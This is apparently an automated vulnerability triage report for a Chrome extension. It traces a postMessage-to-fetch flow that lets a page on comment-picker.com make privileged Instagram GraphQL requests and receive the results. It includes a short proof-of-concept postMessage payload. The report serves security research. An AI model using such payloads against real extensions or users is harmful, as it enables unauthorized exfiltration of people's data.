# CoCo Analysis: bdjfjaodadioagkajmblldeiaclcpfmc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdjfjaodadioagkajmblldeiaclcpfmc/opgen_generated_files/cs_0.js
Line 467: window.addEventListener("message", function (event) {
Line 468: if (event.data.type == "page") {
Line 469: chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdjfjaodadioagkajmblldeiaclcpfmc/opgen_generated_files/bg.js
Line 971: fetch(url + encodeURIComponent(JSON.stringify(request.payload)))

**Code:**

```javascript
// Content script (cs_0.js, lines 467-473)
window.addEventListener("message", function (event) { // ← Attacker entry point
    if (event.data.type == "page") {
        chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) { // ← attacker-controlled payload
            window.postMessage(resp, "*") // ← Response sent back to attacker
        });
    }
}, false);

// Background script (bg.js, lines 965-980)
chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        console.log(request, sender.tab, sender.tab.url);

        var url = "https://www.instagram.com/graphql/query/?query_hash=bc3296d1ce80a24b1b6e40b1e72903f5&variables=";

        fetch(url + encodeURIComponent(JSON.stringify(request.payload))) // ← attacker-controlled payload in fetch
            .then(result => result.json())
            .then(response => {
                console.log(response);
                sendResponse({ type: "extension", response }); // ← Response sent back
            });

       return true;
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from whitelisted domains (comment-picker.com)

**Attack:**

```javascript
// From comment-picker.com (or compromised/attacker-controlled subdomain)
window.postMessage({
    type: "page",
    payload: {
        "user_id": "target_user_id",
        "include_reel": true,
        // Attacker can manipulate Instagram GraphQL query parameters
    }
}, "*");

// Extension will fetch: https://www.instagram.com/graphql/query/?query_hash=bc3296d1ce80a24b1b6e40b1e72903f5&variables=<attacker_controlled_params>
// Response is sent back to attacker via window.postMessage
```

**Impact:** An attacker controlling or compromising comment-picker.com can abuse the extension's host_permissions for instagram.com to make privileged cross-origin requests to Instagram's GraphQL API. The attacker can craft arbitrary GraphQL query variables, send them via the extension (bypassing CORS), and receive the API responses back. This enables unauthorized data exfiltration from Instagram (user profiles, posts, comments, etc.) through the extension's elevated permissions.

---

## Sink 2: fetch_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdjfjaodadioagkajmblldeiaclcpfmc/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch';

**Code:**

```javascript
// This appears to be CoCo framework code only (Line 265 is in the framework header)
// The actual flow is covered in Sink 1 above where:
// fetch() response → sendResponse() → window.postMessage() in content script
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Same as Sink 1

**Attack:** Same as Sink 1 (covered above)

**Impact:** This is the response path of the same vulnerability described in Sink 1. The fetch response flows back to the attacker via sendResponse and window.postMessage, completing the data exfiltration path.
